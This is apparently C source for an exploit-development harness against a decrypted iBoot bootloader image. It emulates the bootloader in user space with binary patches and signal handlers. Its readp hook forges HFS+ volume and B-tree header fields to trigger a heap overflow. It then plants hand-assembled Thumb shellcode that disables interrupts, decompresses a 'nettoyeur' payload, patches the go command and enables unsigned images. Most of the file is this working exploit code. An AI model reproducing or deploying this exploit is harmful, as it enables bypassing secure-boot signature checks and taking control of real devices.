#define IMAGE_NAME        "iBoot.n90bap.RELEASE.dec" //need to have this in the same folder of the exec
#define IMAGE_START        0x5FF00000 //yes
#define IMAGE_END          0x5FF50004 //yes
#define IMAGE_SIZE         (IMAGE_END - IMAGE_START)
#define IMAGE_HEAP_SIZE        0xAEFFA //should be right
#define IMAGE_BSS_START        0x5FF41640 //yes
#define IMAGE_BSS_END          0x5FF50004 //yes
#define IMAGE_TEXT_END        0x5FF50000 /* XXX this is a lie */
#define IMAGE_STACK_SIZE    0x1000 //todo
#define IMAGE_LOADADDR        0x40000000 //yes
#define IMAGE_HUGECHUNK        0x3000000 //yes


#define breakpoint1_ADDR    (0x17850 + 1) /* ResolvePathToCatalogEntry */ //yes

#define fuck1_ADDR        (0x18726 + 1) //yes1
#define fuck2_ADDR        (0x1873C + 1) //yes1
#define fuck3_ADDR        (0x18852 + 1) //yes1

#define wait_for_event_ADDR    (0x00814) //yes
#define hugechunk_ADDR        (0x00CAE + 1) //yes
#define gpio_pin_state_ADDR    (0x02694 + 1) //yes
#define gpio_set_state_ADDR    (0x026BC + 1) //yes
#define get_timer_us_ADDR    (0x094DC + 1) //yes
#define reset_cpu_ADDR        (0x095A0 + 1) //yes
#define readp_ADDR        (0x184EC + 1) //yes
#define get_mem_size_ADDR    (0x14D14 + 1) //yes
#define putchar_ADDR        (0x31B78 + 1) //yes
#define adjust_stack_ADDR    (0x1D6E0 + 1) //yes
#define adjust_environ_ADDR    (0x1DB14 + 1) //yes
#define disable_interrupts_ADDR    (0x32884 + 1) //yes
#define cache_stuff_ADDR    (0x20300 + 1) //yes
#define wtf_ADDR        (0x????? + 1) //???

#define iboot_warmup_ADDR    (0x00110) //yes
#define iboot_start_ADDR    (0x00BD0 + 1) //yes
#define main_task_ADDR        (0x00C3C + 1) //yes
#define panic_ADDR        (0x1E928 + 1) //yes
#define system_init_ADDR    (0x1EA14 + 1) //yes
#define task_create_ADDR    (0x1F044 + 1) //yes
#define task_start_ADDR        (0x1F1A4 + 1) //yes
#define task_exit_ADDR        (0x1F1C8 + 1) //yes
#define printf_ADDR        (0x313E0 + 1) //yes
#define malloc_ADDR        (0x18508 + 1) //yes
#define free_ADDR        (0x185BC + 1) //yes
#define create_envvar_ADDR    (0x16E2C + 1) //yes
#define bcopy_ADDR        (0x31E64) //yes
#define decompress_lzss_ADDR    (0x23260 + 1) //yes
/*
struct list_node {
    struct list_node *prev;
    struct list_node *next;
}

struct task {
    char start[4]; //0x0, =0x7461736b, ("task", in viewer is "ksat")
    uint32_t u1; //0x4, =0x5ff41348
    uint32_t u2; //0x8, =*0x5ff4134c =0x5ff41348
    struct list_node queue; //0xC
    uint32_t state; //0x14
    uint32_t irq_disable_count; //0x18
    unsigned char u3[0x150];
    struct list_node waiter; //0x16C
    unsigned char u4[0xC];
    void *stack_ptr; //0x180, points to a structure of "stak" (in viewer is "kats") strings concatenated
    uint32_t stack_len; //0x184, fixed size of 0x1C00
    char name[0x10]; //0x188
    uint32_t task_id; //0x198
    char end[4]; //0x19C, =0x74736b32 ("tsk2", in viewer is "2kst")
};
*/
void NAKED
my_breakpoint1(void)
{
#ifdef __arm__
    __asm volatile (
    /* debug */
    BCALL(my_breakpoint1_helper)
    /* replacement insn */
    "ldrb r4, [r11];"
    /* return */
    "bx lr;"
    );
#endif /* __arm__ */
}


#ifdef __arm__
void
real_fuck1(unsigned int r0, unsigned int r1, unsigned int r2, unsigned int r3)
{
    register unsigned int r8 __asm("r8");
    register unsigned int sp __asm("r11");
    //=0x47F20 -> static u_int32_t free_mem;
    //probably looking for static static char gBootPResponse[0x12C];
    if (sp <= (uintptr_t)image + 0x447A0 + 0x28 + 32 * 4) {
        unsigned int t2 = (uintptr_t)image + 0x447A0 + 0x28 + r3 * 4;
        fprintf(stderr, "_memalign: sp = 0x%x, r8 = 0x%x, r3 = 0x%x, r2 => 0x%x (0x%x)\n", sp, r8, r3, t2, sp - t2);
        dumpfile("DUMP_z1");
    }
    (void)(r0 && r1 && r2);
}

void
real_fuck2(unsigned int r0, unsigned int r1, unsigned int r2, unsigned int r3)
{
    register unsigned int r9 __asm("r9");
    register unsigned int sp __asm("r11");
    if (sp <= (uintptr_t)image + 0x447A0 + 0x28 + 32 * 4) {
#define ULAT(x) (((x) & 0xFFFFF) + IMAGE_START)
        unsigned int t4 = r2 - 0x40;
        unsigned int t1 = r0 + (r1 << 6);
        unsigned int u4 = ULAT(r2) - 0x40;
        unsigned int u1 = ULAT(r0) + (r1 << 6);
#undef ULAT
        fprintf(stderr, "_memalign: sp = 0x%x, r0 = 0x%x, r1 = 0x%x (0x%x/0x%x), r2 = 0x%x, r3 = 0x%x, r4 => (0x%x/0x%x), r9 = 0x%x (0x%x)\n", sp, r0, r1, t1, u1, r2, r3, t4, u4, r9, t1 - t4);
        dumpfile("DUMP_z2");
    }
}

void
real_fuck3(unsigned int r0, unsigned int r1, unsigned int r2, unsigned int r3)
{
    register unsigned int r8 __asm("r8");
    register unsigned int sp __asm("r11");
    if (sp <= (uintptr_t)image + 0x447A0 + 0x28 + 32 * 4) {
        fprintf(stderr, "_memalign: sp = 0x%x, r8 = 0x%x\n", sp, r8);
        dumpfile("DUMP_z3");
    }
    (void)(r0 && r1 && r2 && r3);
}
#endif /* __arm__ */


void NAKED
fuck1(void)
{
#ifdef __arm__
    /* can use: r6, r10, r11 (r0, r1, r2) */
    __asm volatile (
    "mov    r10, lr;"
    "mov    r11, sp;"
    "blx    _getstak;"        /* XXX hope it only destroys r0 */
    "mov    sp, r0;"
    "push   { r0-r12 };"
    "blx    _real_fuck1;"
    "pop    { r0-r12 };"
    "mov    sp, r11;"
    "add    r6, r4, #0x3f;" //todo
    "bx     r10;"
    );
#endif /* __arm__ */
}

void NAKED
fuck2(void)
{
#ifdef __arm__
    /* can use: r4, r10, r11 */
    __asm volatile (
    "mov    r10, lr;"
    "mov    r11, sp;"
    "mov    r4, r0;"
    "blx    _getstak;"        /* XXX hope it only destroys r0 */
    "mov    sp, r0;"
    "mov    r0, r4;"
    "push   { r0-r12 };"
    "blx    _real_fuck2;"
    "pop    { r0-r12 };"
    "mov    sp, r11;"
    "sub    r4, r2, #0x40;" //todo
    "bx     r10;"
    );
#endif /* __arm__ */
}

void NAKED
fuck3(void)
{
#ifdef __arm__
    /* can use: r10, r11 (r2, r3, r5, r6) */
    __asm volatile (
    "str    r0, [r8];"
    "mov    r10, lr;"
    "mov    r11, sp;"
    "mov    r6, r0;"
    "blx    _getstak;"        /* XXX hope it only destroys r0 */
    "mov    sp, r0;"
    "mov    r0, r6;"
    "push   { r0-r12 };"
    "blx    _real_fuck3;"
    "pop    { r0-r12 };"
    "mov    sp, r11;"
    "bx     r10;"
    );
#endif /* __arm__ */
}


void
my_adjust_stack(void)
{
#if 0
    CALL(malloc)(2048 - 64);
#elif 0
    int i;
    for (i = 0; i < 16; i++) {
    CALL(malloc)(64);
    }
#else
    void *ptr;
    ptr = CALL(malloc)(2048 - 64);
    CALL(free)(ptr);
    CALL(malloc)(1024 - 64);
    CALL(malloc)(1024 - 64);
#endif
}


void
my_adjust_environ(void)
{
#if 0
    CALL(create_envvar)("boot-ramdisk", "/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/disk.dmg", 0);
#endif
}


void
suck_sid(void)
{
    fprintf(stderr, "suck sid\n");
#if 0*999
    /* XXX missing 44368 (bootstrap_task::irq_disable_count=2 vs 1), 44380 (bootstrap_task::registers.R9=5FF489C0 vs 0) */
    *(uint32_t *)XLAT(0x5ff44170) = 0x00000000;
    *(uint32_t *)XLAT(0x5ff44174) = 0x00000000;
    *(uint32_t *)XLAT(0x5ff44178) = 0x00000000;
    *(uint32_t *)XLAT(0x5ff4417c) = 0x00000000;
    *(uint32_t *)XLAT(0x5ff4423c) = 0xffffffff;
    *(uint32_t *)XLAT(0x5ff44258) = 0x00000000;
    *(uint32_t *)XLAT(0x5ff4425c) = 0xffffffff;
    *(uint32_t *)XLAT(0x5ff44260) = 0x00000000;
    *(uint32_t *)XLAT(0x5ff44264) = 0x00000000;
    *(uint32_t *)XLAT(0x5ff44270) = 0x00000000;
    *(uint32_t *)XLAT(0x5ff44274) = 0x00000000;
    *(uint32_t *)XLAT(0x5ff4427c) = 0x00000000;
    *(uint32_t *)XLAT(0x5ff44284) = 0x00000000;
    *(uint32_t *)XLAT(0x5ff4428c) = 0x00000000;
    *(uint32_t *)XLAT(0x5ff44290) = 0x00000000;
    *(uint32_t *)XLAT(0x5ff44294) = 0x00000000;
    *(uint32_t *)XLAT(0x5ff44298) = 0x00000000;
    *(uint32_t *)XLAT(0x5ff4429c) = 0x00000000;
    *(uint32_t *)XLAT(0x5ff442a0) = 0x00000000;
    *(uint32_t *)XLAT(0x5ff442a4) = 0x00000000;
    *(uint32_t *)XLAT(0x5ff442a8) = 0x00000000;
    *(uint32_t *)XLAT(0x5ff442c0) = 0x00000001;
    *(uint32_t *)XLAT(0x5ff442c4) = 0x00000011;
    *(uint32_t *)XLAT(0x5ff442c8) = XLAT(0x5ff442c8);
    *(uint32_t *)XLAT(0x5ff442cc) = XLAT(0x5ff442c8);
    *(uint32_t *)XLAT(0x5ff44300) = XLAT(0x5ff44300);
    *(uint32_t *)XLAT(0x5ff44304) = XLAT(0x5ff44300);
    *(uint32_t *)XLAT(0x5ff44308) = XLAT(0x5ff44308);
    *(uint32_t *)XLAT(0x5ff4430c) = XLAT(0x5ff44308);
    *(uint32_t *)XLAT(0x5ff44314) = 0xffffffff;
    *(uint32_t *)XLAT(0x5ff44318) = 0xffffffff;
    *(uint32_t *)XLAT(0x5ff44330) = XLAT(0x5ff44350);
    *(uint32_t *)XLAT(0x5ff44348) = XLAT(0x5ff44348);
    *(uint32_t *)XLAT(0x5ff4434c) = XLAT(0x5ff44348);
    *(uint32_t *)XLAT(0x5ff44364) = 0x00000002;
    *(uint32_t *)XLAT(0x5ff4436c) = 0x00000000;
    *(uint32_t *)XLAT(0x5ff44370) = 0x00000000;
    *(uint32_t *)XLAT(0x5ff44374) = 0x00000000;
    *(uint32_t *)XLAT(0x5ff44378) = 0x00000000;
    *(uint32_t *)XLAT(0x5ff44388) = 0x00000000;
    *(uint32_t *)XLAT(0x5ff4438c) = 0x00000000;
    *(uint32_t *)XLAT(0x5ff44390) = 0x00000000;
    *(uint32_t *)XLAT(0x5ff444bc) = 0x00000000;
    *(uint32_t *)XLAT(0x5ff444c0) = 0x00000000;
    *(uint32_t *)XLAT(0x5ff444f4) = 0xffffffff;
    *(uint32_t *)XLAT(0x5ff44d04) = XLAT(0x5ff44d04);
    *(uint32_t *)XLAT(0x5ff44d08) = XLAT(0x5ff44d04);
#endif
    dumpfile("DUMP2");
}

//todo
int
my_readp(void *ih, void *buffer, long long offset, int length)
{
#define TREEDEPTH 0
#define TRYFIRST 1
#define TRYLAST 0
    long long off;
    eprintf("%s(%p, %p, 0x%llx, %d)\n", __FUNCTION__, ih, buffer, offset, length);
#if TRYLAST
    if (buffer == (void *)IMAGE_LOADADDR) {
        return length;
    }
#endif
    off = lseek(rfd, offset, SEEK_SET);
    assert(off == offset);
    length = read(rfd, buffer, length);
#if TREEDEPTH || TRYFIRST || TRYLAST
#define NODE_SIZE (4096 * 4)
#define TOTAL_NODES (0xFFF)
#define ROOT_NODE (0xFFFFFF / NODE_SIZE - 1)
#define EXTENT_SIZE ((unsigned long long)NODE_SIZE * (unsigned long long)TOTAL_NODES)
    if (1) {
    /* XXX stack recursion eats 208 bytes, watch out for 0x4D2C0 + 0x18 = 0x4D2D8 */
    /* XXX stack recursione eats ??? bytes watch out for 0x41350 + 0x18 = 0x41368 */
    /* that address contains the irq_disable_count of the boootstrap task */
    /* probably to watch out as it is between the garbage writing */
        static int seq = 0;
        switch (seq) {
            case 0:
                //here buffer is struct HFSPlusVolumeHeader
                //keep in mind that finderinfo[8] in this iBoot version
                PUT_QWORD_BE(buffer, 0x110, 512ULL * 0x7FFFFFULL);    /* HFSPlusVolumeHeader::catalogFile.logicalSize */
                PUT_QWORD_BE(buffer,  0xC0, EXTENT_SIZE);        /* HFSPlusVolumeHeader::extentsFile.logicalSize */
                break;
            case 1:
                memset(buffer, 'E', length);
                //here buffer refers to the memory layout of btrees, which can be found here https://developer.apple.com/library/archive/technotes/tn/tn1150.html#BTrees
                //initially we have a struct BTNodeDescriptor which is 14 bytes
                //then we have the struct BTHeaderRec
                /*
                 | BTNodeDescriptor | 14 bytes
                 | BTHeaderRec      | 106 bytes
                 */
#if TREEDEPTH
                PUT_WORD_BE(buffer, 14, 3);                /* BTHeaderRec::treeDepth */
#elif TRYLAST
                PUT_WORD_BE(buffer, 14, 2);                /* BTHeaderRec::treeDepth */
#endif
                PUT_WORD_BE(buffer, 32, 512);            /* BTHeaderRec::nodeSize */
                PUT_DWORD_BE(buffer, 36, 0x7FFFFF);            /* BTHeaderRec::totalNodes */
#if TRYFIRST
                PUT_DWORD_BE(buffer, 16, (0xFFFFFF / 512 - 1));    /* BTHeaderRec::rootNode (trigger) =0x7FFE */
#else
                PUT_DWORD_BE(buffer, 16, 3);            /* BTHeaderRec::rootNode */
#endif
                memcpy((char *)buffer + 40, nettoyeur, (nettoyeur_sz < 216) ? nettoyeur_sz : 216);
                break;
            case 2:
                memset(buffer, 'F', length);
                if (nettoyeur_sz > 216) memcpy(buffer, nettoyeur + 216, nettoyeur_sz - 216);
                PUT_WORD_BE(buffer, 32, NODE_SIZE);            /* BTHeaderRec::nodeSize */
                PUT_DWORD_BE(buffer, 36, TOTAL_NODES);        /* BTHeaderRec::totalNodes */
                PUT_DWORD_BE(buffer, 16, 0x500);            /* BTHeaderRec::rootNode (must be big, but LSB must be zero) */
                PUT_WORD_LE(buffer, 20, 0);                /* must be zero (see above) */
                PUT_WORD_LE(buffer, 14, 0);                /* must be zero, to allow r3 to grow */
                
#if 1
#define START_OF_BTREE_HEADER 0x0 //useless
#define START_OF_EXTENTS_BTREE_HEADER 0x0
#define ALIGNED_POINTER_OFFSET 0x0
#endif
                
                PUT_DWORD_LE(buffer, 78, (uintptr_t)image + ALIGNED_POINTER_OFFSET);            /* *r2 = r4 */
                PUT_DWORD_LE(buffer, 0x47E40 + 4 - 0x47E14, (NODE_SIZE + 0x40) >> 6);    /* *(r0 + 4) = r9 */
                PUT_DWORD_LE(buffer, 0x47E40 + 0x40 - 0x47E14, (uintptr_t)image + 0x47E89);    /* r10 (code exec) */
                PUT_DWORD_LE(buffer, 0x47E40 + 0x44 - 0x47E14, (uintptr_t)image + 0x47F84);    /* r11 -> lr */
#if 0
                PUT_WORD_LE(buffer, 0x47E88 + 0 - 0x47E14, INSNT_ILLEGAL);
#else
                PUT_DWORD_LE(buffer, 0x47E88 +   0 - 0x47E14, INSNW_LDR_SP_PC72);
                PUT_DWORD_LE(buffer, 0x47E88 +   4 - 0x47E14, make_bl(0, 0x47E88 +  4, disable_interrupts_ADDR - 1));
                PUT_WORD_LE(buffer,  0x47E88 +   8 - 0x47E14, INSNT_LDR_R_PC(4, 68));
                PUT_WORD_LE(buffer,  0x47E88 +  10 - 0x47E14, INSNT_LDR_R_PC(0, 72));
                PUT_WORD_LE(buffer,  0x47E88 +  12 - 0x47E14, INSNT_MOV_R_R(1, 4));
                PUT_WORD_LE(buffer,  0x47E88 +  14 - 0x47E14, INSNT_LDR_R_PC(2, 72));
                PUT_DWORD_LE(buffer, 0x47E88 +  16 - 0x47E14, make_bl(1, 0x47E88 + 16, bcopy_ADDR));
                PUT_DWORD_LE(buffer, 0x47E88 +  20 - 0x47E14, INSNW_MOV_R1_2400);
                PUT_DWORD_LE(buffer, 0x47E88 +  24 - 0x47E14, INSNW_STRH_R1_R4_E2C);
                PUT_WORD_LE(buffer,  0x47E88 +  28 - 0x47E14, INSNT_LDR_R_PC(0, 60));
                PUT_DWORD_LE(buffer, 0x47E88 +  30 - 0x47E14, INSNW_MOV_R1_40000000);
                PUT_WORD_LE(buffer,  0x47E88 +  34 - 0x47E14, INSNT_STR_R1_R4_R0);
                PUT_WORD_LE(buffer,  0x47E88 +  36 - 0x47E14, INSNT_LDR_R_PC(0, 56));
                PUT_WORD_LE(buffer,  0x47E88 +  38 - 0x47E14, INSNT_LDR_R_PC(1, 60));
                PUT_WORD_LE(buffer,  0x47E88 +  40 - 0x47E14, INSNT_STR_R1_R4_R0);
                PUT_WORD_LE(buffer,  0x47E88 +  42 - 0x47E14, INSNT_LDR_R_PC(0, 60));
                PUT_WORD_LE(buffer,  0x47E88 +  44 - 0x47E14, INSNT_MOV_R_I(1, 0xFC));
                PUT_WORD_LE(buffer,  0x47E88 +  46 - 0x47E14, INSNT_LDR_R_PC(2, 60));
                PUT_WORD_LE(buffer,  0x47E88 +  48 - 0x47E14, INSNT_MOV_R_I(3, nettoyeur_sz));
                PUT_WORD_LE(buffer,  0x47E88 +  50 - 0x47E14, INSNT_PUSH_R0);
                PUT_DWORD_LE(buffer, 0x47E88 +  52 - 0x47E14, make_bl(0, 0x47E88 + 52, decompress_lzss_ADDR - 1));
                PUT_WORD_LE(buffer,  0x47E88 +  56 - 0x47E14, INSNT_LDR_R_PC(0, 52));
                PUT_WORD_LE(buffer,  0x47E88 +  58 - 0x47E14, INSNT_BLX_R(0));
                PUT_WORD_LE(buffer,  0x47E88 +  60 - 0x47E14, INSNT_MOV_R_R(14, 4));
                PUT_WORD_LE(buffer,  0x47E88 +  62 - 0x47E14, INSNT_POP_PC);
                PUT_DWORD_LE(buffer, 0x47E88 +  76 - 0x47E14, (uintptr_t)image + IMAGE_SIZE + IMAGE_HEAP_SIZE + IMAGE_STACK_SIZE);
                PUT_DWORD_LE(buffer, 0x47E88 +  80 - 0x47E14, (uintptr_t)image /* 0x44000000 */);
                PUT_DWORD_LE(buffer, 0x47E88 +  84 - 0x47E14, (uintptr_t)image /* 0x5ff00000 */);
                PUT_DWORD_LE(buffer, 0x47E88 +  88 - 0x47E14, IMAGE_BSS_START - IMAGE_START);
                PUT_DWORD_LE(buffer, 0x47E88 +  92 - 0x47E14, 0x419F8 /* go command handler */);
                PUT_DWORD_LE(buffer, 0x47E88 +  96 - 0x47E14, 0x191E4 /* allow unsigned images */);
                PUT_DWORD_LE(buffer, 0x47E88 + 100 - 0x47E14, INSN2_MOV_R0_0__STR_R0_R3 /* allow unsigned images */);
                PUT_DWORD_LE(buffer, 0x47E88 + 104 - 0x47E14, (uintptr_t)image + 0x48000 /* nettoyeur uncompressed */);
                PUT_DWORD_LE(buffer, 0x47E88 + 108 - 0x47E14, (uintptr_t)image + 0x47d3c /* nettoyeur compressed */);
                PUT_DWORD_LE(buffer, 0x47E88 + 112 - 0x47E14, (uintptr_t)suck_sid);
#endif
                break;
#if TREEDEPTH
            default:
            {
                static long long oldpos = 0;
                if ((seq % 3) == 0) {
                    ((unsigned char *)buffer)[9]++;                        /* BTNodeDescriptor::height */
                    ((unsigned char *)buffer)[8] = -(((unsigned char *)buffer)[9] == 1);    /* BTNodeDescriptor::kind */
                    oldpos = offset;
                } else if (oldpos) {
                    lseek(rfd, oldpos, SEEK_SET);
                    read(rfd, buffer, length);
                    oldpos = 0;
#if 0
                    if (seq == 1 * 3 + 1) {
                        PUT_DWORD_BE(buffer, 32, 0x10000);
                        break;
                    }
#elif 0
                    if (seq == 2 * 3 + 1) {
                        PUT_DWORD_BE(buffer, 44, 0x10000);
                        break;
                    }
#elif 0
                    if (seq == 3 * 3 + 1) {
                        PUT_DWORD_BE(buffer, 44, 0x10000);
                        break;
                    }
#elif 0
                    if (seq == 4 * 3 + 1) {
                        PUT_DWORD_BE(buffer, 56, 0x10000);
                        break;
                    }
#elif 1
                    if (seq == 5 * 3 + 1) {
                        PUT_DWORD_BE(buffer, 68, 0x10000);
                        break;
                    }
#endif
                }
            }
#endif /* TREEDEPTH */
        }
#if TRYLAST
        if (seq == 2 + (5 * 2) * (2 + TREEDEPTH)) {
            PUT_DWORD_BE(buffer, 0xd6, 1);
        }
#endif /* TRYLAST */
        if (seq < 3) {
            int ofd;
            char tmp[256];
            sprintf(tmp, "BLOCK_%llx_%d", offset, seq);
            ofd = creat(tmp, 0644);
            if (ofd >= 0) {
                write(ofd, buffer, length);
                close(ofd);
            }
        }
        seq++;
    }
#endif
    return length;
}


void
check_irq_count(void)
{
    eprintf("irq_disable_count = 0x%x\n", *(unsigned int *)(image + 0x41350 + 0x18));
}


void
my_cache_stuff(void)
{
#ifdef __APPLE__
    sys_icache_invalidate(image, IMAGE_SIZE + IMAGE_HEAP_SIZE);
#endif
}


#if USE_SIGNAL
#ifdef __arm__
int
dispatch_SEGV(void *si_addr, _STRUCT_ARM_THREAD_STATE *tctx)
{
    struct mmreg {
        unsigned long mmaddr;
        unsigned int pc;
        int reg;
        int val;
        int next;
    };

    static const struct mmreg mmregs[] = {
    /* nop 0xbf106000, 0xbf50000{0,8,c} (serial number) */
    { 0xbf50000c, 0x1DEF8, 0, 0, 2 }, //yes
    { 0xbf50000c, 0x1DEFA, 1, 0, 2 }, //yes
    { 0xbf500000, 0x1DE8E, 0, 0, 2 }, //yes
    { 0xbf500000, 0x1DEAE, 0, 0, 2 }, //yes
    { 0xbf500000, 0x1DE7E, 0, 0, 2 }, //yes
    { 0xbf106000, 0x1DD48, 0, 0, 2 }, //yes
    { 0xbf500008, 0x1DF16, 0, 0, 2 }, //yes
    { 0xbf500008, 0x1DF1C, 2, 0, 2 }, //yes
    { 0xbf50000c, 0x1DF22, 3, 0, 4 }, //yes
    { 0xbf500008, 0x1DF2A, 1, 0, 2 }, //yes
    { 0xbf50000c, 0x1DF2C, 9, 0, 4 }, //yes
    /* nop 0x832000xx (boot failure count) */
    { 0x83200000, 0x09730,-1, 0, 2 }, //yes
    { 0x83200014, 0x09736,-1, 0, 2 }, //yes
    { 0x83200010, 0x0973C,-1, 0, 2 }, //yes
    { 0x83200018, 0x09742,-1, 0, 2 }, //yes
    { 0x83200020, 0x0975A,-1, 0, 2 }, //yes
    { 0x83200024, 0x09766,-1, 0, 2 }, //yes
    /* end-of-table */
    { 0xFFFFFFFF, 0x00000, 0, 0, 0 }, //yes
    };

    const struct mmreg *m;

    if (si_addr == 0) {
        if (tctx->__pc == (uintptr_t)(image + 0x1EE56)) { //yes
            /* idle task crap (read from *0) */
            tctx->__r[0] = *(uint32_t *)(image);
            tctx->__pc += 2;
            return 0;
        }
        if (tctx->__pc == (uintptr_t)(image + 0x1F0B6)) { //yes
            tctx->__r[1] = *(uint32_t *)(image);
            tctx->__pc += 2;
            return 0;
        }
    }

    for (m = mmregs; m->mmaddr != 0xFFFFFFFF; m++) {
        if (si_addr == (void *)m->mmaddr && tctx->__pc == (uintptr_t)(image + m->pc)) {
            int reg = m->reg;
            int val = m->val;
            if (reg >= 0) {
                tctx->__r[reg] = val;
            }
            tctx->__pc += m->next;
            return 0;
        }
    }

    return -1;
}

int
dispatch(int signum, void *si_addr, _STRUCT_ARM_THREAD_STATE *tctx)
{
#if USE_SIGNAL > 1
    if (signum == ILLNO) {
    if ((tctx->__cpsr & 0x20) == 0 && *(uint32_t *)si_addr == INSNA_ILLEGAL) {
        /* ARM handlers: tctx->__pc += 4; */
        uintptr_t addr = (unsigned char *)si_addr - image;
        switch (addr) {
        case wait_for_event_ADDR:
            my_wait_for_event();
        }
    } else if ((tctx->__cpsr & 0x20) != 0 && *(uint16_t *)si_addr == INSNT_ILLEGAL) {
        /* Thumb handlers: tctx->__pc += 2; */
        uintptr_t addr = (unsigned char *)si_addr - image + 1;
        switch (addr) {
        case cache_stuff_ADDR:
            my_cache_stuff();
            tctx->__pc = tctx->__lr;
            return 0;
        case hugechunk_ADDR:
            tctx->__r[0] = (uint32_t)gethuge();
            tctx->__pc += 4;
            return 0;
        case gpio_pin_state_ADDR:
            tctx->__r[0] = my_gpio_pin_state(tctx->__r[0]);
            tctx->__pc = tctx->__lr;
            return 0;
        case gpio_set_state_ADDR:
            my_gpio_set_state(tctx->__r[0], tctx->__r[1]);
            tctx->__pc = tctx->__lr;
            return 0;
        case get_timer_us_ADDR:
            *(uint64_t *)(&tctx->__r[0]) = my_get_timer_us();
            tctx->__pc = tctx->__lr;
            return 0;
        case reset_cpu_ADDR:
            my_reset_cpu();
        case readp_ADDR:
            tctx->__r[0] = my_readp((void *)tctx->__r[0], (void *)tctx->__r[1], *(uint64_t *)(&tctx->__r[2]), *(uint32_t *)tctx->__sp);
            tctx->__pc = tctx->__lr;
            return 0;
        case get_mem_size_ADDR:
            tctx->__r[0] = my_get_mem_size();
            tctx->__pc = tctx->__lr;
            return 0;
        case putchar_ADDR:
            putchar(tctx->__r[0]);
            tctx->__pc = tctx->__lr;
            return 0;
        case adjust_stack_ADDR:
            my_adjust_stack();
            tctx->__pc = tctx->__lr;
            return 0;
        case adjust_environ_ADDR:
            my_adjust_environ();
            tctx->__pc = tctx->__lr;
            return 0;
        case breakpoint1_ADDR:
            my_breakpoint1_helper(tctx->__r[0], tctx->__r[1], tctx->__r[2], tctx->__r[3], tctx->__sp, tctx->__lr);
            tctx->__r[4] = *(unsigned char *)tctx->__r[11];
            tctx->__pc += 4;
            return 0;
        }
    }
    }
#endif /* USE_SIGNAL > 1 */
    if (signum == SIGSEGV) {
    return dispatch_SEGV(si_addr, tctx);
    }
    return -1;
}
#endif /* __arm__ */
#endif /* USE_SIGNAL */


void
patch_image(unsigned char *image)
{
    /* jump directly to warmup */
    *image = (iboot_warmup_ADDR - 8) / 4;
    /* heap hardcoded offset */
    *(uint32_t *)(image + 0x1EA20) = INSN2_LDR_R1_PC__B_PLUS4; //yes
    *(void **)(image + 0x1EA24) = XLAT(IMAGE_END + IMAGE_HEAP_SIZE); //yes
    /* clean data cache */
    *(uint32_t *)(image + 0x1FDDC) = INSNA_RETURN; //yes
#if !USE_SIGNAL
    /* idle task crap (read from *0) */
    *(uint16_t *)(image + 0x1EE56) = INSNT_NOP; //yes
    *(uint16_t *)(image + 0x1F0B6) = INSNT_MOV_R_R(1, 0); //yes
#endif /* !USE_SIGNAL */
    /* timer 2 */
    *(uint16_t *)(image + 0x1E448) = INSNT_MOV_R_I(1, 0); //yes
    *(uint16_t *)(image + 0x1E452) = INSNT_NOP;
    /* task switch FPU */
    *(uint32_t *)(image + 0x20338) = INSNA_MOV_R2_0; //yes
    *(uint32_t *)(image + 0x20338) = INSNA_MOV_R2_0; //doubled?
    /* bzero during mmu_init */
    *(uint32_t *)(image + 0x1F5F0) = INSN2_NOP__NOP; //yes
    /* nop some calls during iboot_start */
    *(uint32_t *)(image + 0x00BD6) = INSN2_NOP__NOP; //yes
#if 0 /* adjust_stack */
    *(uint32_t *)(image + 0x00BDE) = INSN2_NOP__NOP; //yes
#endif

    /* nop spi stuff */
#if 0 /* adjust_environ */
    *(uint32_t *)(image + 0xCBA) = INSN2_NOP__NOP; //yes
#endif
    /* FPEXC triggered by nvram_save() */
    *(uint32_t *)(image + 0x498) = INSNA_NOP; //yes
    *(uint32_t *)(image + 0x490) = INSNA_NOP; //yes

    /* pretend we have nand device? */
    *(uint32_t *)(image + 0xA70) = INSN2_MOV_R0_1__MOV_R0_1; //yes
    *(uint32_t *)(image + 0x18122) = INSN2_MOV_R0_1__MOV_R0_1; //yes

    /* make main_task show SP */
    *(uint16_t *)(image + 0xD94) = INSNT_MOV_R_R(1, 13); //yes
    *(uint8_t *)(image + 0x32CA4) = 'x'; //yes
    /* show task structure */
    *(void **)(image + 0xFA4) = image + 0x41330; //yes
    *(uint8_t *)(image + 0x32C90) = 'x'; //yes

    /* nop NAND */
    *(uint32_t *)(image + 0x1D940) = INSN2_NOP__NOP; //yes
    /* nop 0x832000xx (boot failure count) */
#if !USE_SIGNAL
    *(uint16_t *)(image + 0x09730) = INSNT_NOP; //yes
    *(uint16_t *)(image + 0x09736) = INSNT_NOP; //yes
    *(uint16_t *)(image + 0x0973C) = INSNT_NOP; //yes
    *(uint16_t *)(image + 0x09742) = INSNT_NOP; //yes
    *(uint16_t *)(image + 0x0975A) = INSNT_NOP; //yes
    *(uint16_t *)(image + 0x09766) = INSNT_NOP; //yes
#endif /* !USE_SIGNAL */
    *(uint16_t *)(image + 0x09772) = INSNT_NOP;

    /* nop some more hw */
    *(uint32_t *)(image + 0x1D8F0) = INSN2_RETURN_0; //yes
    *(uint32_t *)(image + 0x1D8DE) = INSN2_NOP__NOP; //yes
    *(uint32_t *)(image + 0x1D8E2) = INSN2_NOP__NOP; //yes
#if !USE_SIGNAL
    /* nop 0xbf106000, 0xbf50000{0,8,c} (serial number) */
    *(uint32_t *)(image + 0x1DEF0) = INSN2_RETURN_0; //yes
    *(uint32_t *)(image + 0x1DE8E) = INSN2_RETURN_0; //yes
    *(uint32_t *)(image + 0x1DEAE) = INSN2_RETURN_0; //yes
    *(uint32_t *)(image + 0x1DE7E) = INSN2_RETURN_0; //yes
    *(uint32_t *)(image + 0x1DD48) = INSN2_RETURN_0; //yes
    *(uint32_t *)(image + 0x1DF08) = INSN2_RETURN_0; //yes
#endif /* !USE_SIGNAL */
}


void
patch_nettoyeur(unsigned char *nettoyeur)
{
    *(void **)(nettoyeur + 0xF0) = image + *(uint32_t *)(nettoyeur + 0xF0) - (IMAGE_LOADADDR + 0x4000000);
    *(void **)(nettoyeur + 0xF4) = XLAT(*(uint32_t *)(nettoyeur + 0xF4));
    *(void **)(nettoyeur + 0xF8) = XLAT(*(uint32_t *)(nettoyeur + 0xF8));
}

